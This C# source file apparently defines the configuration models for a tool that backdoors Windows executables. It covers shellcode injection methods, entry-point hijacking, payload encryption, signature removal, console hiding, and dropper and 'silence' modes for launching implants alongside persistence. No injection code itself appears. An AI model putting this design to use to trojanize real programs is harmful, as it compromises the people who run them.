namespace Washmachine.Models;

/// <summary>
/// Configuration options for PE backdooring operations.
/// </summary>
public sealed class PeBackdoorOptions
{
    /// <summary>Path to the target PE file to backdoor.</summary>
    public string TargetPePath { get; set; } = string.Empty;

    /// <summary>Path to the shellcode file (.bin) to inject.</summary>
    public string ShellcodePath { get; set; } = string.Empty;

    /// <summary>Output path for the backdoored PE file.</summary>
    public string OutputPath { get; set; } = string.Empty;

    /// <summary>The injection method to use.</summary>
    public InjectionMethod Method { get; set; } = InjectionMethod.CodeCave;

    /// <summary>Where to store the payload in the PE.</summary>
    public PayloadLocation PayloadLocation { get; set; } = PayloadLocation.NewSection;

    /// <summary>How to invoke the carrier code.</summary>
    public CarrierInvoke CarrierInvoke { get; set; } = CarrierInvoke.EntryPointHijack;

    /// <summary>Encryption for the payload.</summary>
    public PayloadEncryption Encryption { get; set; } = PayloadEncryption.Xor;

    /// <summary>XOR key for encryption (if using XOR). 0 = random.</summary>
    public byte XorKey { get; set; } = 0x42;

    /// <summary>Minimum code cave size to consider (0 = auto-calculate from payload).</summary>
    public int MinCaveSize { get; set; } = 0;

    /// <summary>If true, only analyze and report — don't actually inject.</summary>
    public bool DryRun { get; set; } = false;

    /// <summary>Whether to preserve the original entry point functionality.</summary>
    public bool PreserveOriginalEntry { get; set; } = true;

    /// <summary>Whether to patch IAT if required imports are missing.</summary>
    public bool PatchIat { get; set; } = true;

    /// <summary>Whether to remove the PE signature.</summary>
    public bool RemoveSignature { get; set; } = true;

    /// <summary>Whether to patch subsystem to GUI (hide console).</summary>
    public bool PatchSubsystemToGui { get; set; } = true;

    /// <summary>Section name for new section injection.</summary>
    public string NewSectionName { get; set; } = ".extra";

    /// <summary>Whether to patch destructive exit calls (ExitProcess, SEH crash) to ExitThread.</summary>
    public bool PatchExitCalls { get; set; } = true;

    /// <summary>For DLL injection: which export to backdoor.</summary>
    public string? DllExportName { get; set; }

    /// <summary>Backdoor execution mode.</summary>
    public BackdoorMode Mode { get; set; } = BackdoorMode.Normal;

    /// <summary>Path to the standalone implant EXE to embed (Dropper mode only).</summary>
    public string? ImplantPath { get; set; }
}

/// <summary>
/// Method used to inject shellcode into the PE.
/// </summary>
public enum InjectionMethod
{
    /// <summary>Find and use existing code caves (null bytes) in .text section.</summary>
    CodeCave,

    /// <summary>Add a new executable section to the PE.</summary>
    NewSection,

    /// <summary>Overwrite unused space at the end of .text section.</summary>
    TextSectionPadding,

    /// <summary>Append shellcode after the last section and extend it.</summary>
    SectionExtension,

    /// <summary>Use TLS callback for execution.</summary>
    TlsCallback
}

/// <summary>
/// Where the encrypted payload is stored in the PE.
/// </summary>
public enum PayloadLocation
{
    /// <summary>Store in .rdata section (appears as data).</summary>
    RdataSection,

    /// <summary>Store in .text section (appears as code).</summary>
    TextSection,

    /// <summary>Store in a new section.</summary>
    NewSection
}

/// <summary>
/// How the carrier (loader) code is invoked.
/// </summary>
public enum CarrierInvoke
{
    /// <summary>Overwrite the entry point to jump to carrier.</summary>
    EntryPointHijack,

    /// <summary>Backdoor a JMP/CALL instruction in the entry function.</summary>
    EntryFunctionBackdoor,

    /// <summary>Use TLS callback (runs before main).</summary>
    TlsCallback,

    /// <summary>For DLLs: hook DllMain.</summary>
    DllMain,

    /// <summary>For DLLs: hook a specific export.</summary>
    DllExport
}

/// <summary>
/// Encryption method for the payload.
/// </summary>
public enum PayloadEncryption
{
    /// <summary>No encryption.</summary>
    None,

    /// <summary>Single-byte XOR.</summary>
    Xor,

    /// <summary>Two-byte XOR.</summary>
    Xor2,

    /// <summary>RC4 encryption.</summary>
    Rc4
}

/// <summary>
/// Backdoor execution mode controlling how the injected stub behaves at runtime.
/// </summary>
public enum BackdoorMode
{
    /// <summary>
    /// Normal: shellcode runs in a CreateThread alongside the host.
    /// Both host and implant execute on every launch.
    /// Incompatible with persistence snippets.
    /// </summary>
    Normal,

    /// <summary>
    /// Dropper: host PE carries an encrypted implant EXE in an appended .dpl section.
    /// At first run the stub decrypts, writes to %TEMP%, and CreateProcessW-launches it,
    /// then resumes the host OEP. Fully compatible with persistence in the implant.
    /// </summary>
    Dropper,

    /// <summary>
    /// Silence: if the backdoored PE is launched with any argument the shellcode runs
    /// silently (host UI suppressed). Without arguments the host executes normally while
    /// the shellcode runs in a background thread.
    /// Persistence snippets should register the payload with a silence argument
    /// (configured via the BackdoorConfig/SilenceArg YAML snippet).
    /// </summary>
    Silence,
}

/// <summary>
/// Information about a PE section.
/// </summary>
public sealed class PeSectionInfo
{
    public string Name { get; set; } = string.Empty;
    public uint VirtualAddress { get; set; }
    public uint VirtualSize { get; set; }
    public uint RawAddress { get; set; }
    public uint RawSize { get; set; }
    public uint Characteristics { get; set; }
    public bool IsExecutable => (Characteristics & 0x20000000) != 0; // IMAGE_SCN_MEM_EXECUTE
    public bool IsReadable => (Characteristics & 0x40000000) != 0;   // IMAGE_SCN_MEM_READ
    public bool IsWritable => (Characteristics & 0x80000000) != 0;   // IMAGE_SCN_MEM_WRITE
}

/// <summary>
/// Information about a PE file.
/// </summary>
public sealed class PeInfo
{
    public string FilePath { get; set; } = string.Empty;
    public bool Is64Bit { get; set; }
    public bool IsDll { get; set; }
    public bool IsDotNet { get; set; }
    public bool HasAslr { get; set; }
    public bool HasSignature { get; set; }
    public uint EntryPoint { get; set; }
    public ulong ImageBase { get; set; }
    public List<PeSectionInfo> Sections { get; set; } = new();
    public List<string> Imports { get; set; } = new();
    public List<string> Exports { get; set; } = new();
    public long FileSize { get; set; }
}

/// <summary>
/// Code cave found in a PE file.
/// </summary>
public sealed class CodeCave
{
    public string SectionName { get; set; } = string.Empty;
    public uint FileOffset { get; set; }
    public uint VirtualAddress { get; set; }
    public uint Size { get; set; }
}

/// <summary>
/// Result of a backdooring operation.
/// </summary>
public sealed class BackdoorResult
{
    public bool Success { get; set; }
    public string? OutputPath { get; set; }
    public string? ErrorMessage { get; set; }
    public uint ShellcodeAddress { get; set; }
    public uint CarrierAddress { get; set; }
    public int ShellcodeSize { get; set; }
    public int CarrierSize { get; set; }
    public List<string> Warnings { get; set; } = new();
    public List<string> Steps { get; set; } = new();
}
